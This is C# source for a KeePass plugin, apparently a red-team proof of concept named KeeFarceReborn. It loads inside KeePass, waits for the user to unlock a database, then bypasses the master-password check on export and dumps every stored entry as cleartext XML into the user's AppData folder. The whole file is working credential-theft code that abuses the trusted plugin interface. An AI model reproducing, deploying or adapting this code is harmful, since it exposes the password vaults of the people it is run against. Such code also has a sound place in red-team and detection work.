using System;
using System.IO;
using System.Windows.Forms;
using KeePass.DataExchange;
using KeePass.Forms;
using KeePass.Plugins;
using KeePassLib.Utility;
using KeePass;
using KeePassLib.Serialization;
using KeePass.App;
using KeePassLib.Keys;
using KeePassLib;

namespace KeeFarceRebornPlugin
{
    public sealed class KeeFarceRebornPluginExt : Plugin
    {
        private IPluginHost m_host = null;

        public override bool Initialize(IPluginHost host)
        {
            if (host == null) return false;
            m_host = host;
            m_host.MainWindow.FileOpened += this.OnFileOpened;
            return true;
        }

        private void OnFileOpened(object sender, FileOpenedEventArgs e)
        {
            MessageBox.Show("Database was opened!");
            
            // get the required info needed to perform export
            // no need to load assembly as we can use the plugin's m_host to intract with keepass
            var database = m_host.Database;
            var rootGroup = database.RootGroup;      
            MessageBox.Show("Found every object we need");

            // build the objects needed to perform export
            PwExportInfo pwExportInfo = new PwExportInfo(rootGroup, database);
            FileFormatProvider fileFormat = Program.FileFormatPool.Find("KeePass XML (2.x)");
            string exportFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "export.xml");
            IOConnectionInfo iocOutput = IOConnectionInfo.FromPath(exportFilePath);

            // re-implement KeePass export method to skip master password dialog (see: KeePass/DataExchange/ExportUtil.cs)
            // we skip lots of line of the original function as we do not care with parent groups (we focus on the root group only) 
            if (pwExportInfo == null) return;
            if (pwExportInfo.DataGroup == null) return;
            if (fileFormat == null) return;
            
            bool bFileReq = fileFormat.RequiresFile;
            if (bFileReq && (iocOutput == null)) return;
            if (bFileReq && (iocOutput.Path.Length == 0)) return;

            PwDatabase pd = pwExportInfo.ContextDatabase;
            if (pd == null) return; 
            if (!AppPolicy.Try(AppPolicyId.Export)) return;         
            if (!fileFormat.SupportsExport) return;
            if (!fileFormat.TryBeginExport()) return;

            CompositeKey ckOrgMasterKey = null;
            DateTime dtOrgMasterKey = PwDefs.DtDefaultNow;

            PwGroup pgOrgData = pwExportInfo.DataGroup;
            PwGroup pgOrgRoot = ((pd != null) ? pd.RootGroup : null);
            bool bExistedAlready = true;
            bool bResult = false;

            try
            {
                if (bFileReq) bExistedAlready = IOConnection.FileExists(iocOutput);

                Stream s = (bFileReq ? IOConnection.OpenWrite(iocOutput) : null);
                try { 
                    bResult = fileFormat.Export(pwExportInfo, s, null); 
                    MessageBox.Show("Called Export method, check %APPDATA% for cleartext database export in XML");
                }
                finally { if (s != null) s.Close(); }

            }
            catch (Exception ex) { MessageService.ShowWarning(ex); }
            finally
            {
                if (ckOrgMasterKey != null)
                {
                    pd.MasterKey = ckOrgMasterKey;
                    pd.MasterKeyChanged = dtOrgMasterKey;
                }       
            }

            if (bFileReq && !bResult && !bExistedAlready)
            {
                try { IOConnection.DeleteFile(iocOutput); }
                catch (Exception) { }
            }
            return;
        }
    }
}